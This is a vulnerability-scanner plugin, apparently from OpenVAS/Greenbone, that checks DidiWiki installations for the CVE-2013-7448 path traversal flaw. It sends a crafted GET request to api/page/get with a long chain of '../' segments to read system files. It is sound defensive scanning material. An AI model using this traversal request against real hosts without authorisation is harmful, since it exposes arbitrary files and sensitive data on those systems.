CPE = "cpe:/a:didiwiki_project:didiwiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807528" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-7448" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-04-12 10:34:57 +0530 (Tue, 12 Apr 2016)" );
	script_name( "DidiWiki Path Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_didiwiki_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "DidiWiki/Installed" );
	script_require_ports( "Services/www", 8000 );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2016/02/19/4" );
	script_tag( name: "summary", value: "This host is installed with DidiWiki
  and is prone to path traversal." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not." );
	script_tag( name: "insight", value: "The flaw is due to an insufficient input
  validation via 'page' parameter to api/page/get in 'wiki.c' script" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to read arbitrary files and to obtain sensitive information." );
	script_tag( name: "affected", value: "didiwiki versions 3.5.4 and prior" );
	script_tag( name: "solution", value: "Apply the patch from advisory." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://didiwiki.wikidot.com" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/api/page/get?page=" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

